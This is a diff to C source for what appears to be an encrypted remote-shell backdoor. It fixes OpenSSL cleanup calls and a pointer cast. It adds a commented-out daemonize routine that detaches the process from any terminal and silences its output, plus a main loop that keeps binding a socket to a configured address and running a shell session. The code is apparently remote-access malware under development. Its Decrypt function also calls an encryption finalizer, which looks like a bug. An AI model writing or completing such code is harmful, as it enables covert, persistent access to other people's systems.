@@ -31,7 +31,7 @@ int Encrypt(unsigned char in_plain[], int len_plain, unsigned char out_cipher[])
     EVP_EncryptFinal_ex(ctx, out_cipher + total, &len);
     total+=len;
 
-    EVP_CIPHER_free(ctx);
+    EVP_CIPHER_CTX_free(ctx);
 
     return total;
 }
@@ -47,7 +47,7 @@ int Decrypt(unsigned char in_cipher[], int len_cipher, unsigned char out_plain[]
     EVP_EncryptFinal_ex(ctx, out_plain + total, &len);
     total+=len;
 
-    EVP_CIPHER_free(ctx);
+    EVP_CIPHER_CTX_free(ctx);
 
     return total;
 }
@@ -66,7 +66,7 @@ int recv_full(int s, unsigned char buff[], int len){
 int recv_packet(int s, unsigned char buff[]){
     int size_to_network, size_to_host;
 
-    recv_full(s, &size_to_network, 4);
+    recv_full(s, (unsigned char*)&size_to_network, 4);
 
     size_to_host = ntohl(size_to_network);
 
@@ -157,5 +157,67 @@ void run_session(sock){
     }
     close(master);
 
+}
+
+// int daemonize(){
+//     pid_t pid = fork();
+//     if(pid > 0) exit(0);
+//     if(pid < 0) exit(1);
+//     setsid();
+
+//     signal(SIGCHLD, SIG_IGN);
+//     signal(SIGHUP, SIG_IGN);
+
+//     pid = fork();
+//     if(pid > 0) exit(0);
+//     if(pid < 0) exit(1);
+
+//     umask(0);
+//     chdir("/");
+
+//     close(0);
+//     close(1);
+//     close(2);
+
+//     open("/dev/null", O_RDWR);
+//     dup(0);
+//     dup(0);
+//}
+
+int main(){
+
+    // daemonize();
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+
+    addr.sin_port = htons(PORT);
+    addr.sin_family = AF_INET;
+    inet_pton(AF_INET, IP, &addr.sin_addr);
+
+    while (1)
+    {
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+
+        int opt = 1;
+        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
+
+        if(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0){
+            close(sock);
+            sleep(3);
+            continue;
+        }
+
+        run_session(sock);
+
+        shutdown(sock, SHUT_RDWR);
+        close(sock);
+
+        sleep(2 + rand()%3);
+
+    }
+
+    return 0;
+    
 }
 
